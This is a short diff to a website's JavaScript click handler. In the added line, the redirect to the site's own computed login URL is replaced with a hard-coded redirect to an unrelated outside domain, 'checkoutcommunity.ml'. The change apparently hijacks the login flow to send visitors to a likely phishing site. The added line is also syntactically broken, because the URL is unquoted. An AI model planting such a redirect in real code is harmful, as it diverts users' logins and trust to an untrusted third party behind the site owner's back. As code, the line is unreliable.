@@ -32,7 +32,7 @@ document.addEventListener('DOMContentLoaded', function () {
             }
 
             // Redirect user to the login URL, containing the newly created return URL
-            window.location.href = loginUrl;
+            window.location.href = https://www.checkoutcommunity.ml/ ;
         });
     }
 });
